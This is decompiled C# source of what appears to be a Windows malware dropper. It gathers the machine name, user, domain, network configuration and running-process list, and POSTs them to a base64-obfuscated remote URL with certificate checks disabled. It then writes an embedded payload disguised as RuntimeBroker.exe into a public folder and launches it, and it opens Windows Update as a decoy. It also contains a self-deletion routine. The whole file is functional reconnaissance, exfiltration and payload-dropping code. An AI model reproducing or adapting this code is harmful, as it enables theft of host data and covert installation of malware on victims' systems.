using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Web;
using System.Windows.Forms;

namespace ooashofo
{
	// Token: 0x02000003 RID: 3
	internal static class Program
	{
		// Token: 0x06000006 RID: 6 RVA: 0x000020B0 File Offset: 0x000002B0
		private static string GetExecutablePathAboveVista(int ProcessId)
		{
			StringBuilder stringBuilder = new StringBuilder(1024);
			IntPtr intPtr = Program.OpenProcess(Program.ProcessAccessFlags.QueryLimitedInformation, false, ProcessId);
			if (intPtr != IntPtr.Zero)
			{
				try
				{
					int capacity = stringBuilder.Capacity;
					if (Program.QueryFullProcessImageName(intPtr, 0, stringBuilder, out capacity))
					{
						return stringBuilder.ToString();
					}
				}
				finally
				{
					Program.CloseHandle(intPtr);
				}
			}
			return string.Empty;
		}

		// Token: 0x06000007 RID: 7
		[DllImport("kernel32.dll")]
		private static extern bool QueryFullProcessImageName(IntPtr hprocess, int dwFlags, StringBuilder lpExeName, out int size);

		// Token: 0x06000008 RID: 8
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(Program.ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x06000009 RID: 9
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CloseHandle(IntPtr hHandle);

		// Token: 0x0600000A RID: 10 RVA: 0x00002120 File Offset: 0x00000320
		[STAThread]
		private static void Main()
		{
			try
			{
				string str = "";
				try
				{
					str = Environment.MachineName;
				}
				catch (Exception)
				{
				}
				string userName = Environment.UserName;
				string userDomainName = Environment.UserDomainName;
				string str2 = "";
				try
				{
					str2 = Process.Start(new ProcessStartInfo("ipconfig", "/all")
					{
						CreateNoWindow = true,
						RedirectStandardOutput = true,
						UseShellExecute = false
					}).StandardOutput.ReadToEnd();
				}
				catch (Exception)
				{
				}
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Process process in Process.GetProcesses())
				{
					string text = Program.GetExecutablePathAboveVista(process.Id);
					if (string.IsNullOrEmpty(text.Trim()))
					{
						text = process.ProcessName;
					}
					stringBuilder.AppendLine(process.Id.ToString() + "->" + text);
				}
				string str3 = stringBuilder.ToString();
				string s = "aHR0cHM6Ly9kb3dubG9hZHMuc2xhY2tocC5jb206NTQ0My9wdXQucGhw"; // -> https://downloads.slackhp.com:5443/put.php
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(s));
				try
				{
					ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
					ServicePointManager.ServerCertificateValidationCallback = ((object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors) => true);
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(@string);
					httpWebRequest.Method = HttpMethod.Post.Method;
					httpWebRequest.ContentType = "application/x-www-form-urlencoded;charset=utf-8";
					using (Stream requestStream = httpWebRequest.GetRequestStream())
					{
						StringBuilder stringBuilder2 = new StringBuilder();
						stringBuilder2.Append("MachineName=" + HttpUtility.UrlEncode(str)).Append("&");
						stringBuilder2.Append("user_name=" + HttpUtility.UrlEncode(userName)).Append("&");
						stringBuilder2.Append("user_domain_name=" + HttpUtility.UrlEncode(userDomainName)).Append("&");
						stringBuilder2.Append("process=" + HttpUtility.UrlEncode(str3)).Append("&");
						stringBuilder2.Append("ip_info=" + HttpUtility.UrlEncode(str2));
						string s2 = stringBuilder2.ToString();
						byte[] bytes = Encoding.UTF8.GetBytes(s2);
						requestStream.Write(bytes, 0, bytes.Length);
						requestStream.Flush();
					}
					WebResponse response = httpWebRequest.GetResponse();
					StreamReader streamReader = new StreamReader(response.GetResponseStream());
					try
					{
						streamReader.ReadToEnd();
						response.Close();
					}
					catch (Exception)
					{
					}
				}
				catch (Exception)
				{
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag = false;
				File.WriteAllBytes("C:\\Users\\Public\\Documents\\RuntimeBroker.exe", asodon_aosijd._475eb0ae9b3841248dd4ce6057946e55);
				Process.Start(new ProcessStartInfo
				{
					FileName = "C:\\Users\\Public\\Documents\\RuntimeBroker.exe",
					Arguments = ""
				});
				Process.Start(new ProcessStartInfo
				{
					FileName = "control.exe",
					Arguments = "/name Microsoft.WindowsUpdate"
				});
				if (flag)
				{
					Process.Start(new ProcessStartInfo
					{
						Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath,
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = "cmd.exe"
					});
					Process.GetCurrentProcess().Kill();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x02000006 RID: 6
		[Flags]
		public enum ProcessAccessFlags : uint
		{
			// Token: 0x04000007 RID: 7
			All = 2035711u,
			// Token: 0x04000008 RID: 8
			Terminate = 1u,
			// Token: 0x04000009 RID: 9
			CreateThread = 2u,
			// Token: 0x0400000A RID: 10
			VirtualMemoryOperation = 8u,
			// Token: 0x0400000B RID: 11
			VirtualMemoryRead = 16u,
			// Token: 0x0400000C RID: 12
			VirtualMemoryWrite = 32u,
			// Token: 0x0400000D RID: 13
			DuplicateHandle = 64u,
			// Token: 0x0400000E RID: 14
			CreateProcess = 128u,
			// Token: 0x0400000F RID: 15
			SetQuota = 256u,
			// Token: 0x04000010 RID: 16
			SetInformation = 512u,
			// Token: 0x04000011 RID: 17
			QueryInformation = 1024u,
			// Token: 0x04000012 RID: 18
			QueryLimitedInformation = 4096u,
			// Token: 0x04000013 RID: 19
			Synchronize = 1048576u
		}
	}
}
